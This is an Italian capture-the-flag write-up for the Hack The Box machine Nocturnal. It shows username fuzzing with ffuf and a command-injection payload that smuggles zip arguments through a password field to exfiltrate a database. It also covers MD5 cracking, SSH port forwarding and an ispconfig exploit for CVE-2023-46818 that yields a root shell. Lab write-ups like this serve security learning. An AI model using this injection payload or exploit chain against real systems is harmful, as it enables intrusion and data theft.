# Nocturnal🌠

## 📝 Introduzione

In questa writeup vengono descritte *esclusivamente* le operazioni eseguite per ottenere le flag `user.txt` e `root.txt` sulla macchina target (10.10.11.64), seguendo quanto riportato nei log originali.

---

## 🛠️ Strumenti e Tecniche Utilizzate

* **ffuf**: per l’enumerazione del web
* **Code injection** nel campo password dell’admin panel
* **crackstation.net**: per cracking MD5 dell’utente `tobias`
* **ssh & port forwarding**
* **netstat**: per identificare servizi in ascolto
* **Script CVE-2023-46818**: exploit locale per ispconfig

---

## 🔍 1. Enumerazione con ffuf

```bash
ffuf -u http://nocturnal.htb/view.php?username=FUZZ&file=test.txt -w wordlist.txt
```

* **Risultato**: username trovato → `Amanda`

---

## 🔑 2. Accesso con Amanda e Download `privacy.odt`

1. **Trovato file**: `privacy.odt`
2. **Password estratta**: `arH[REDACTED]s1J`

---

## 🛡️ 3. Admin Panel & Code Injection

* Vulnerabilità individuata nel campo **password** dell’admin panel.
* **Obiettivo**: includere nel backup il file `../nocturnal_database/nocturnal_database.db`.

**Payload utilizzato**:

```
faze%09backups/backup_2025-05-06.zip%09-j%09../nocturnal_database/nocturnal_database.db%09.%09#comment
```

* Viene creato un backup contenente `nocturnal_database.db`.

---

## 🛠️ 4. Cracking dell’utente `tobias`

* Hash MD5 ottenuta: `55c82b1ccd55ab219b3b109b07d5061d`
* **Password trovata** su CrackStation: `slo[REDACTED]se`

---

## 🚪 5. Accesso SSH e Lettura `user.txt`

```bash
ssh tobias@10.10.11.64
# Password: slo[REDACTED]se
cat user.txt
[REDACTED]
```

---

## 🔄 6. Port Forwarding & Servizio Locale

1. **Individuazione servizi**:

   ```bash
   netstat -tuln
   ```

   * Servizio in ascolto: `127.0.0.1:8080`

2. **Port forwarding**:

   ```bash
   ssh -L 8080:127.0.0.1:8080 tobias@10.10.11.64
   ```

3. **Visita**: [http://127.0.0.1:8080](http://127.0.0.1:8080)

   * Login: `tobias:slo[REDACTED]se`

---

## 🌐 7. Exploit ispconfig (CVE-2023-46818)

* Trovata CVE: `CVE-2023-46818` per ispconfig
* **Script** copiato in locale e eseguito

```bash
ispconfig-shell# whoami
root

ispconfig-shell# find / -name root.txt 2>/dev/null
/root/root.txt

ispconfig-shell# cat /root/root.txt
[REDACTED]
```



